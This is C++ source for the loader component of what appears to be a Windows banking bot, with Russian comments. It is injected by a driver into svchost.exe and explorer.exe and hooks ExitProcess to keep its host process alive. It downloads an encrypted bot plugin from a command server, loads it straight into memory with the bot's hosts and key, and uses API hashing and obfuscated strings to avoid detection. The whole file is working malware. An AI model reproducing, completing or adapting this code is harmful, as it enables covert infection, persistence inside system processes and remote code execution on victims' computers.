
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

#include "DbgRpt.h"



//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>


void DbgRptSvchostThread(void* Arguments)
{
	LDRDBG("DbgRptSvchostThread", "Sleeping before network started (3 min)...\r\n");
	pSleep(3 * 60 * 1000);

	for(;;)
	{
		LDRDBG("DbgRptSvchostThread", "Notify debug report...\r\n");

		// 304_ld постоянная работа в Svchost (каждые 3 минуты)
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("304_ld"));

		pSleep(3 * 60 * 1000);
	}
}

void DbgRptExplorerThread(void* Arguments)
{
	for(;;)
	{
		LDRDBG("DbgRptExplorerThread", "Notify debug report...\r\n");

		// 305_ld постоянная работа в Explorer (каждые 3 минуты)
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));

		pSleep(3 * 60 * 1000);
	}
}


//----------------------------------------------------------------------------

PWCHAR SVChostName = L"svchost.exe";
char   BotPlugin[] =  "bktestma.plug";

namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

	HANDLE ThreadHandle = NULL; // Хэндл запущенного потока

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// Функция возвращает имя сигнального файла


		// Определяем системный диск
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
		
		PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// Создаём полнлё имя
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// Попытка завершить процесс, если
		// запущен поток загрузки плагина, то дожидаемся его завершения
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// Функция ожидает запуска експлорера

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

//	PCHAR GetBotPlugCacheFileName()
//	{
//		// Функция возвращает имя файла кэша плагина
//		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
//		return BOT::GetWorkPathInSysDrive(NULL, Name);
//	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{
		// Функция загрузки плагина
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
		
		LDRDBG("BRDS", "Отключаем слежение за процессом svchost.exe \r\n");

		DriverRemoveInjectToProcess(InitData, SVChostName);

		for (;;)
		{
				WSADATA wsa;
				ClearStruct(wsa);
				DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
				
				if (Code == 0) break;

				LDRDBG("BRDS", "pWSAStartup failed.");
				return 0; //pSleep(500);
		}
		
		
		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 10) \r\n");

		DWORD Size = 0;
		LPVOID Module = NULL;


		//Загружаем библиотеку
		LDRDBG("BRDS", "Инициализируем загрузку плагина!\r\n");

		// 311_ld начало загрузки файла плага с сервера в svchost
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));


		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);

		LDRDBG("BRDS", "DownloadEx result module=0x%u\r\n", Module);

		// 312_ld окончание загрузки файла плага с сервера в svchost
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("312_ld"));

		if (Module != NULL)
		{
			// Сохраняем данные в кэш
			LDRDBG("BRDS", "Бот успешно загружен \r\n");
			MemFree(Module);

			// передаем прочитанную длл в драйвер	
			// добавляем модуль для инжекта в процесс диспетчера задач

			// Уведомляем експлорер об успешной загрузке длл
			LDRDBG("BRDS", "Уведомляем эксплорер \r\n");

			// 313_ld успешная загрузка файла плага с сервера в svchost
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("313_ld"));

			WaitExplorer();


			PCHAR Buf = "Ok: ";
			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
		}

		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует

		LDRDBG("BRDS", "DownloadMethod finised.\r\n");

		return 0;
	}

	

	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{

		//// 303_ld запуск в Svchost (тут сети может не быть)
		//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("303_ld"));

		// Запускаем поток загружки длл
		
		//===================================================
		// Этап 1. Проверяем существование сигнального файда
		// Для этого создадим файл с экслюзивными праввами и
		// поставим его на удаление после перезапуска системы
		// Хэндл файла закрывать не будем, это даст чёткий
		// сигнал, что процесс запустивший загрузку ещё живой
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// Пытаемся открыть фай
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
		if (H == INVALID_HANDLE_VALUE)
		{
			// Ошибка создания файла, считаем, что
			// в данный момент файлом владеет другой процесс
			STR::Free(FileName);
			return false;
		}

		// Указываем системе, что после перезапуска необходимо
		// удалить файл
		pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// Этап 2: Устанавливаем хуки которые заблокируют
		// эавершение процесса до завершения работы нашего
		// потока
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
		//  Этап 3: Запускаем поток
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
		}
		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);

		//===================================================
		//  Этап 4: Запускаем поток в svchost отзвона на тестовый сервер
		//===================================================
		StartThread(DbgRptSvchostThread, NULL);



		return true;
	}

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// Функция получает параметр лоадера
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);

	STR::Free(Buf);
}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{
	// 320_ld попытка загрузки и запуска BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("320_ld"));


	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);

	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "Не удалось загрузить длл в память \r\n");
		return;
	}

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		// Устанавливаем параметры бота
		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота \r\n");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
	}

	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
		LDRDBG("BRDS Explorer", "Бот успешно запущен \r\n");
		DLLLoader::DLLLoadedInExplorer = true;
		Method(NULL, NULL, NULL);

		// 321_ld попытка загрузки и запуска BotPlug успешна
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("321_ld"));
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS Explorer", "Запускаем длл бота \r\n");

	// 310_ld попытка получить файл плага с кеша в Explorer
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("310_ld"));

	if (IsNewProcess(DLLLoader::ExplorerPID))
		DLLLoader::DLLLoadedInExplorer = false;


	if (DLLLoader::DLLLoadedInExplorer)
		return true;


	LDRDBG("BRDS Explorer", "Читаем плагин из кэша \r\n");
	DWORD Size = 0;
	LPBYTE Module = Plugin::DownloadFromCache(BotPlugin, true, NULL, &Size);

	if (Module != NULL)
	{
		// Расшифровываем содержимое
		if (DelayBeforeStart != 0)
		pSleep(DelayBeforeStart);

		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована \r\n");
		ExplorerLoadDLL(InitData, Module, Size);

		MemFree(Module);
	}


	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	LDRDBG("BRDS", "Зупущена функция Эксплорера  \r\n");

	if (Data == NULL) 
	{
		LDRDBG("BRDS Explorer", "Ошибочные данные для работы в эксплорере \r\n");
		return 0;
	}

	// 302_ld запуск в Explorer (тут сети может не быть)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("302_ld"));

	// Запускаем поток в svchost отзвона на тестовый сервер
	StartThread(DbgRptExplorerThread, NULL);

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	LDRDBG("BRDS Explorer", "Ожидаем пока драйвер отключит слежение за процессоь svchost.exe \r\n");
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);


	LDRDBG("BRDS Explorer", "Запуск потока Эксплорера \r\n");

	// Первым делом пытаемся запустить длл из файла
	
	if (DoStartBotDll(InitData, 5000))
	{	
		LDRDBG("BRDS Explorer", "Бот успешно загружен из кэша \r\n");
		return 0;
	} 

	// Регистрируем событие обратной связи
	LDRDBG("BRDS Explorer", "Регистрируем метод обратной связи в процессе Explorer \r\n");
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS Explorer", "Ошибка регистрации метода обратной свзи експлорера \r\n");
		return 0;
	}

	// Запускаем бесконечный цикл ожидания

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

extern"C" __declspec(dllexport) VOID NTAPI  Start(
							PVOID  NormalContext /*системный указатель*/,
							PUSER_INIT_NOTIFY  SystemArgument1 /*аргумент который нужно сохранить чтоб использовать общение с драйвером*/,
							PVOID SystemArgument2/* ничего не передаеться*/)
{
	// стартуем поток загрузки длл 
	if (SystemArgument1 == NULL)
		return;


	// определяем в каком процессе находимся
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	LDRDBG("BRDS", "LoaderDll loaded ...\r\n");

	//// 301_ld запуск вообще (тут сети может не быть)
	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{

		PCHAR CL = (PCHAR)pGetCommandLineA();

		LDRDBG("BRDS", "Драйвер перехватил запуск процесса svchost.exe \r\n");
		LDRDBG("BRDS", "Командная строка svchost.exe - %s \r\n", CL);

		//if (STR::Pos(CL, "localservice", 0, false) >= 0)
		{
			DLLLoader::StartLoaderThread(SystemArgument1);
		}
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// 
		LDRDBG("BRDS", "Драйвер перехватил запуск эксплорера \r\n");
		StartThread(ExplorerStartProc, SystemArgument1);
	}
};

BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
{
		DWORD Size = 0;
		LPVOID Module = NULL;

		//Загружаем библиотеку
		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!\r\n");

		// 315_ld начало загрузки файла плага методом LoadPlugToCache
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));

		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);

		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u\r\n", Module);

		// 316_ld окончание загрузки файла плага методом LoadPlugToCache
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));

		if (Module != NULL)
		{
			// Сохраняем данные в кэш
			LDRDBG("LoadPlugToCache", "Module successfuly loaded.\r\n");
			
			// 317_ld успешная загрузка файла плага методом LoadPlugToCache
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
			
			MemFree(Module);
			return TRUE;
		}

		return FALSE;
}

#pragma comment(linker, "/ENTRY:LoaderDllMain" )

DWORD WINAPI LoaderDllMain(DWORD, DWORD, DWORD)
{
	//return 0;
	return TRUE;
}
